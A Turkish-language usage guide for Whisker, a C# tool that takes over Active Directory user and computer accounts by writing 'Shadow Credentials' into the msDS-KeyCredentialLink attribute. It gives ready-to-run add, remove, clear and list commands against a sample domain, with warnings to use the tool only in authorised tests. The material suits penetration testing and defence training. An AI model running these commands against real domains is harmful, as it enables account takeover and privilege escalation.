# Whisker Kullanım Rehberi

## Whisker Nedir?

**Whisker**, Active Directory (AD) kullanıcı ve bilgisayar hesaplarını ele geçirmek için msDS-KeyCredentialLink özniteliğini manipüle ederek "Shadow Credentials" (Gölge Kimlik Bilgileri) ekleme imkânı sağlayan bir C# aracıdır. Araç, Michael Grafnetter'in (@MGrafnetter) DSInternals kodu üzerine inşa edilmiştir.

> **Önemli Not:** Whisker yalnızca yetkili test ortamlarında ve etik kullanım amaçlı çalıştırılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Çalışma Gereksinimleri

1. **Desteklenen Domain Controller:**
   - Windows Server 2016 veya üstü.
2. **PKINIT Kerberos Kimlik Doğrulama:**
   - Domain Controller üzerinde sunucu kimlik doğrulama sertifikası olmalıdır.

---

## İndirme ve Çalıştırma

Whisker aracı GitHub üzerinden sağlanabilir:

- [Whisker GitHub Sayfası](https://github.com/eladshamir/Whisker)

### Çalıştırma Adımları

1. **Araç Dosyasını İndirin:**
   ```bash
   git clone https://github.com/eladshamir/Whisker.git
   ```

2. **Proje Çalıştırma:**
   ```bash
   Whisker.exe <parametreler>
   ```

---

## Kullanım Komutları

### 1. Yeni Bir Gölge Kimlik Bilgisi Eklemek

Bir hedef nesnenin `msDS-KeyCredentialLink` özniteliğine yeni bir değer ekler.

**Parametreler:**
- `/target:<samAccountName>`: Hedef nesne adı. Bilgisayar nesneleri için `$` işareti eklenmelidir. (**Gerekli**)
- `/domain:<FQDN>`: Hedef domain adı. (**Opsiyonel**)
- `/dc:<IP/HOSTNAME>`: Hedef Domain Controller. (**Opsiyonel**)
- `/path:<PATH>`: Sertifikayı depolamak için yol. (**Opsiyonel**)
- `/password:<PASSWORD>`: Sertifika için şifre. (**Opsiyonel**)

**Örnek Kullanım:**
```bash
Whisker.exe add /target:computername$ /domain:contoso.local /dc:dc1.contoso.local /path:C:\cert.pfx /password:P@ssword1
```

### 2. Mevcut Bir Değeri Kaldırmak

Hedef nesnenin `msDS-KeyCredentialLink` özniteliğinden belirli bir DeviceID'yi kaldırır.

**Parametreler:**
- `/target:<samAccountName>`: Hedef nesne adı. (**Gerekli**)
- `/deviceID:<GUID>`: Kaldırılacak değer için DeviceID. (**Gerekli**)
- `/domain:<FQDN>`: Hedef domain adı. (**Opsiyonel**)
- `/dc:<IP/HOSTNAME>`: Hedef Domain Controller. (**Opsiyonel**)

**Örnek Kullanım:**
```bash
Whisker.exe remove /target:computername$ /domain:contoso.local /dc:dc1.contoso.local /deviceid:2de4643a-2e0b-438f-a99d-5cb058b3254b
```

### 3. Tüm Değerleri Temizlemek

Bir nesnenin `msDS-KeyCredentialLink` özniteliğindeki tüm değerleri kaldırır.

**Parametreler:**
- `/target:<samAccountName>`: Hedef nesne adı. (**Gerekli**)
- `/domain:<FQDN>`: Hedef domain adı. (**Opsiyonel**)
- `/dc:<IP/HOSTNAME>`: Hedef Domain Controller. (**Opsiyonel**)

**Örnek Kullanım:**
```bash
Whisker.exe clear /target:computername$ /domain:contoso.local /dc:dc1.contoso.local
```

⚠️ **Uyarı:** Şifresiz kimlik doğrulama için yapılandırılmış hesaplarda bu özniteliğin temizlenmesi kesintilere neden olabilir.

### 4. Mevcut Değerleri Listelemek

Hedef nesnenin `msDS-KeyCredentialLink` özniteliğindeki tüm değerleri listeler.

**Parametreler:**
- `/target:<samAccountName>`: Hedef nesne adı. (**Gerekli**)
- `/domain:<FQDN>`: Hedef domain adı. (**Opsiyonel**)
- `/dc:<IP/HOSTNAME>`: Hedef Domain Controller. (**Opsiyonel**)

**Örnek Kullanım:**
```bash
Whisker.exe list /target:computername$ /domain:contoso.local /dc:dc1.contoso.local
```

---

## Kaynaklar

- [DSInternals Projesi](https://github.com/MichaelGrafnetter/DSInternals)
- [Shadow Credentials Blog Yazısı](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
